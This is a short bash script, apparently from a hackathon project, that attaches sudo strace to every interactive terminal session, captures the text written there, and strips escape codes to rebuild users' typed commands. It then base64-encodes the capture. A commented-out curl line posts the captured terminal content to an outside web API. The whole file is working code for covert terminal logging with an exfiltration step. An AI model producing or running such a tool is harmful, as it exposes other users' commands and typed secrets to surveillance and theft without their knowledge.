#!/usr/bin/env bash

BUFFER=buf.txt
first=0

# Requires sudo, strace and GNU grep

trimxxd () {
  cat /dev/stdin |
  sed -e 's/\(0a\|0d\)*$//g' -e 's/^\(0a\|0d\)*//g' -e 's/2020$/20/g'
}

get-between () {
  cat /dev/stdin             |
  grep                       \
  --line-buffered            \
  -o '".*[^"]"'              |

  grep                       \
  --line-buffered            \
  -o '[^"]*[^"]'
}

write-buffer () {
  buffer="${1}"
  cat /dev/stdin >> "${buffer}"
}

clear-buffer () {
  buffer="${1}"
  : > "${buffer}"
}

send-buffer () {
  buffer="${1}"
  content="$(cat "${BUFFER}" | xxd -ps -c0 | sed -e 's/\(0d\)\?1b5b3f323030346\(8\|c\)//g' -e 's/0d$//g' -e 's/^24//g' | xxd -ps -c0 -r | base64 -w0)"
  if [ -n "${content}" ]; then
    echo "{${content}}"
    # curl -sL https://hackhpi.kyudev.xyz/api/blue -X POST -H "Content-Type: application/json" -d "{\"data\": \"${content}\", \"timestamp\": \"$(date +%s)\"}" 1>/dev/null
  fi
  clear-buffer "${BUFFER}"
}

delete-buffer () {
  buffer="${1}"
  rm -f "${buffer}"
}

clear-buffer "${BUFFER}"
sudo strace       \
  -e trace=write  \
  -s 1000         \
  -f              \
  $(ps u                       |
    grep pts                   |
    grep Ss                    |
    grep -v grep               |
    awk '{print "-p " $2 " "}' |
    xargs)        \
 2>&1             |
while IFS="" read -r line; do
  between="$(printf '%s' "${line}" | get-between)"
  fd="$(printf '%s' "${line}" | grep -o 'write(.' | tail -c 2 | head -c 1)"
  if [ "${fd}" = "1" ] || [ "${fd}" = "4" ]; then
    first=1
  elif [ "$(printf '%s' "${between}" | wc -c)" -gt 10 ] || [ "${fd}" = "3" ]; then
    :
  else
    if [ "${first}" = "1" ]; then
      first=0
      send-buffer "${BUFFER}"
    fi
    pre_replace="$(printf '%b' "${between}" | xxd -ps -c0 | trimxxd)"
    replace="$(printf '%s' "${pre_replace}" | sed -e 's/^1b5b3f323030346c/BEGIN/g' -e 's/1b5b3f3230303468.*/AFTER/g')"
    if [ "${between}" = " " ] ||[ "${between}" = "\n" ] || [ -n "${replace}" ] && [ "${replace}" = "${pre_replace}" ]; then
      printf '%b' "${between}" | write-buffer "${BUFFER}"
    fi
  fi
done
delete-buffer "${BUFFER}"
